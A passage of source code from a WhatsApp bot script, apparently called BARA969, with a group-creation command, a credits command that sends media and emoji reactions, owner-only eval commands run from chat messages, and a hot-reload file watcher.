    await famzz.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break;
case "buatgc":
case "buatgroup": {
if (!isOwner) return m.reply(mess.owner)
if (!q) return m.reply("nama grup")
let res = await famzz.groupCreate(q, [])
const urlGrup = "https://chat.whatsapp.com/" + await famzz.groupInviteCode(res.id)
let teks = `
*Grup WhatsApp Berhasil Dibuat ✅*
link group: ${urlGrup}
`
return m.reply(teks)
}
break
case 'thanksto':
       case 'tqto': {
    let thanks = `\`\`\`THANKS TO MY FRIENDS\`\`\` 
\`\`\`╭──⬣
│ㅤ모 BARA NAK MELETUP [ CREATOR ].
╰──⬣\`\`\`
\`\`\`all who uses this script\`\`\`
`
await famzz.sendMessage(m.chat, {
      video: { url: 'https://files.catbox.moe/wxg4v0.mp4' },
      gifPlayback: true,
      caption: thanks,
      contextInfo: {
      externalAdReply: {
      showAdAttribution: true,
      title: "𝙱𝙰𝚁𝙰𝟿𝟼𝟿 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 𝟷.𝟶",
      body: "𝙱𝙰𝚁𝙰𝟿𝟼𝟿 ",
      thumbnailUrl: 'https://img1.pixhost.to/images/6076/604846252_vynx.jpg',
      sourceUrl: "https://whatsapp.com/channel/0029Vb6OBghDTkJwnpEU2C",
      mediaType: 1,
      renderLargerThumbnail: false
      }
      }
      }, {
                        quoted: fkontak
                    })
      famzz.sendMessage(m.chat, {
                        audio: fs.readFileSync('./media/menu.mp3'),
                        mimetype: 'audio/mp4',
                        ptt: true
                    }, {
                        quoted: PayX
                    })
await famzz.sendMessage(m.chat, { react: { text: "🤍",key: m.key,}})
await famzz.sendMessage(m.chat, { react: { text: "🩶",key: m.key,}})
await famzz.sendMessage(m.chat, { react: { text: "🩵",key: m.key,}})
await famzz.sendMessage(m.chat, { react: { text: "🩷",key: m.key,}})
await famzz.sendMessage(m.chat, { react: { text: "💛",key: m.key,}})
await famzz.sendMessage(m.chat, { react: { text: "❤️",key: m.key,}})
await famzz.sendMessage(m.chat, { react: { text: "💔",key: m.key,}})  
}
          break        
//BATAS CASE      
default:
if (budy.startsWith('>')) {
if (!isOwner) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.reply(evaled);
} catch (err) {
m.reply(String(err));
}
}
        
if (budy.startsWith('<')) {
if (!isOwner) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}
        
}
} catch (err) {
console.log(require("util").format(err));
}
}

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
})
  
